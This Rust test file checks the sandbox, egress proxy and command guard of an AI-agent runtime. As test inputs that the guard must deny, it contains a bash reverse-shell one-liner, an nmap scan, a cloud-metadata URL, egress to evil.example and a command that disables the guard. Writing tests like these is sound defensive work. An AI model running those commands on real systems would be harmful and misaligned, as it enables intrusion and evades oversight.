// SPDX-FileCopyrightText: Copyright (c) 2026 Navegos. @DevelVitorF. All Rights Reserved.
// SPDX-License-Identifier: Apache-2.0
// project: neo
// file: crates/toksi/tests/phase18_5_adr_sandbox_and_guard_verification.rs
// created: 2026-11-21

#![deny(unsafe_code)]

use std::path::Path;

use toksi::agent_runtime::codemode::{normalize_opencode_hook_event, OpenCodeHooksConfig};
use toksi::agent_runtime::openshell::{
    evaluate_openshell_egress, evaluate_openshell_execution, OpenShellPolicy,
};
use toksi::agent_runtime::sandbox::{
    build_linux_bwrap_args, build_macos_sbpl_profile, global_sandbox_manager, DomainFilterProxy,
    PermissionPolicy, SandboxBackend, SandboxManager, SkillsMountMode, SBX_BUILT_IN_AGENTS,
    SBX_VERBS,
};
use toksi::agent_runtime::sandbox_e2b::{
    build_envd_rpc_payload, create_e2b_microvm_session, E2bTemplateSpec, EnvdRpcRequest,
};
use toksi::agent_runtime::slash::{global_slash_engine, CORE_SLASH_COMMANDS};
use toksi::agent_runtime::unification::{
    build_unified_source_report, deduplicate_slash_commands, UNIFIED_AGENT_SOURCES,
};
use toksi::commands::guard::{
    is_kill_switch_triggered, reset_kill_switch_state, CommandGuard, GuardDecision,
    OffensiveCategory, PROHIBITED_OFFENSIVE_BINARIES,
};
use toksi::config::SecurityConfig;
use toksi::security::adr::{ActionOrigin, AdrDisposition, AdrEngine, AgentAction};
use toksi::security::blind_compiler::compile_blind_bundle;

#[test]
fn test_phase18_5_cross_agent_unification_and_opencode_hooks() {
    assert!(UNIFIED_AGENT_SOURCES.len() >= 35);
    assert!(UNIFIED_AGENT_SOURCES.contains(&"opencode"));
    assert!(UNIFIED_AGENT_SOURCES.contains(&"codex"));
    assert!(UNIFIED_AGENT_SOURCES.contains(&"hermes-agent"));
    assert!(UNIFIED_AGENT_SOURCES.contains(&"openclaw-rs"));
    assert!(UNIFIED_AGENT_SOURCES.contains(&"loopwright"));

    let (canonical, rejected) = deduplicate_slash_commands(&[
        "/byok",
        "/codex_byok",
        "/opencode-security",
        "/hermes-agent_resume",
        "/custom-tool",
    ]);
    assert_eq!(rejected.len(), 3);
    assert!(canonical.iter().any(|i: &String| i == "/custom-tool"));
    for c in CORE_SLASH_COMMANDS {
        assert!(canonical.iter().any(|i: &String| i == c));
    }

    let report = build_unified_source_report(&["/opencode_model"]);
    assert!(report.direct_wire_enabled);
    assert!(report.headroom_7_entrypoints_wired);
    assert!(report.externalized_skills_only);
    assert_eq!(report.deduplicated_aliases, vec!["/opencode_model".to_string()]);

    let hooks = OpenCodeHooksConfig::default();
    assert!(!hooks.session_start.is_empty());
    assert!(!hooks.session_shutdown.is_empty());
    assert!(!hooks.before_agent_start.is_empty());
    assert!(!hooks.turn_start.is_empty());
    assert!(!hooks.turn_end.is_empty());
    assert!(!hooks.tool_call.is_empty());
    assert!(!hooks.tool_result.is_empty());
    assert!(!hooks.shell_env.is_empty());
    assert_eq!(normalize_opencode_hook_event("session_start"), "SessionInit");
    assert_eq!(normalize_opencode_hook_event("shell.env"), "ToolPre");
}

#[test]
fn test_phase18_5_multi_backend_sandbox_and_sbx_parity() {
    let sec = SecurityConfig::default();
    assert!(sec.kill_all_services_on_bypass);
    assert!(sec.adr_enabled);
    assert_eq!(sec.sandbox_backend, "auto");

    assert_eq!(SBX_VERBS.len(), 29);
    assert_eq!(SBX_BUILT_IN_AGENTS.len(), 8);
    assert_eq!(SandboxBackend::from_str_loose("sandbox-runtime"), SandboxBackend::SandboxRuntime);
    assert_eq!(SandboxBackend::from_str_loose("openshell"), SandboxBackend::OpenShell);
    assert_eq!(SandboxBackend::from_str_loose("e2b"), SandboxBackend::E2b);
    assert_eq!(SandboxBackend::from_str_loose("sbx"), SandboxBackend::Sbx);

    let ws = Path::new("d:/AI/neo");
    let pol = PermissionPolicy {
        skills_mode: SkillsMountMode::ReadOnly,
        ..Default::default()
    };
    let sbpl = build_macos_sbpl_profile(ws, &pol);
    assert!(sbpl.contains("(deny default)"));
    let bwrap = build_linux_bwrap_args(ws, &pol, "echo", &["ok".to_string()]);
    assert!(bwrap.iter().any(|i| i == "--unshare-net"));

    let proxy = DomainFilterProxy::default();
    assert!(proxy.is_host_allowed("api.openai.com"));
    assert!(!proxy.is_host_allowed("127.0.0.1"));
    assert!(!proxy.is_host_allowed("169.254.169.254"));

    let os_pol = OpenShellPolicy::default();
    let os_ok = evaluate_openshell_execution("cargo check", &os_pol, &pol).expect("openshell");
    assert!(os_ok.allowed);
    let os_deny = evaluate_openshell_execution("nmap -sV 10.0.0.1", &os_pol, &pol).expect("openshell");
    assert!(!os_deny.allowed);
    assert!(evaluate_openshell_egress("localhost", &os_pol));
    assert!(!evaluate_openshell_egress("evil.example", &os_pol));

    let e2b_sess = create_e2b_microvm_session("sbx-e2b-1", &E2bTemplateSpec::default(), 300);
    assert_eq!(e2b_sess.state, "running");
    let rpc = build_envd_rpc_payload(&EnvdRpcRequest::FsRead {
        path: "/workspace/README.md".to_string(),
    });
    assert!(rpc.contains("fs_read"));

    let mgr = SandboxManager::new();
    mgr.set_secret("github", "ghp_super_secret_value_12345");
    let injected = mgr.resolve_proxy_injected_env();
    assert_eq!(
        injected.get("TOKSI_SECRET_GITHUB").map(String::as_str),
        Some("toksi-secret-handle://github")
    );
    assert!(!injected
        .values()
        .any(|v| v.contains("ghp_super_secret_value_12345")));

    let slash = global_slash_engine().execute("/sandbox ls", "toksi-cli");
    assert!(slash.handled);
    assert!(slash.output.contains("[/sandbox ls]"));
    let _ = global_sandbox_manager();
}

#[test]
fn test_phase18_5_adr_command_guard_and_bypass_kill_switch() {
    reset_kill_switch_state();
    assert!(!is_kill_switch_triggered());
    assert!(PROHIBITED_OFFENSIVE_BINARIES.len() >= 33);

    // Safe command allowed
    assert!(CommandGuard::check_pre_exec("toksi-cli", "cargo check --workspace", None).is_allowed());
    // Benign substring ("sync" contains "nc", "success" contains "su") must NOT false-positive
    assert!(CommandGuard::check_pre_exec("toksi-cli", "toksi skills sync", None).is_allowed());

    // Offensive binaries & reverse shells denied
    let nmap = CommandGuard::check_pre_exec("agent-x", "nmap -sS 192.168.1.0/24", None);
    assert!(matches!(
        nmap,
        GuardDecision::Deny {
            category: OffensiveCategory::ExternalReconScan,
            ..
        }
    ));
    let rev = CommandGuard::check_pre_exec("agent-x", "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", None);
    assert!(matches!(
        rev,
        GuardDecision::Deny {
            category: OffensiveCategory::ReverseShellOrTunnel,
            ..
        }
    ));

    // ADR routing: verified safe -> VerifiedSafe; untrusted -> Sandboxed with SARIF + alerts
    let tmp = tempfile::tempdir().expect("tmp");
    let safe_dec = AdrEngine::inspect(
        &AgentAction::Command {
            program: "cargo".to_string(),
            args: vec!["test".to_string()],
        },
        "siagent-core",
        ActionOrigin::VerifiedWorkspace,
        Some(tmp.path()),
        None,
    );
    assert_eq!(safe_dec.disposition, AdrDisposition::VerifiedSafe);
    assert!(safe_dec.svid_spiffe_id.starts_with("spiffe://toksi.local/"));

    let untrusted_dec = AdrEngine::inspect(
        &AgentAction::WebRequest {
            url: "http://169.254.169.254/latest/meta-data/".to_string(),
            method: "GET".to_string(),
        },
        "peer-agent",
        ActionOrigin::Untrusted,
        Some(tmp.path()),
        None,
    );
    assert_eq!(untrusted_dec.disposition, AdrDisposition::Sandboxed);
    assert!(untrusted_dec.sandbox_id.is_some());
    assert!(untrusted_dec.sarif_json.is_some());
    assert!(untrusted_dec.alert.as_ref().is_some_and(|a| a.notify_user && a.notify_orchestrator));

    // Zero-plaintext blind rule integration
    let blind = compile_blind_bundle(
        &["dangerous_eval_sink"],
        &[],
        "high",
        "TOKSI-ADR-TEST",
        b"0123456789abcdef0123456789abcdef",
    )
    .expect("blind");
    assert!(!blind.blake3_ngrams.is_empty());

    // Mandatory Bypass Kill-Switch
    let ks = CommandGuard::check_pre_exec(
        "rogue-agent",
        "toksi run --disable-commandguard",
        Some(tmp.path()),
    );
    assert!(matches!(ks, GuardDecision::KillSwitchTriggered { .. }));
    assert!(is_kill_switch_triggered());

    // Subsequent calls fail closed while kill-switch is active
    let after = CommandGuard::check_pre_exec("toksi-cli", "echo hello", Some(tmp.path()));
    assert!(matches!(after, GuardDecision::KillSwitchTriggered { .. }));

    reset_kill_switch_state();
}
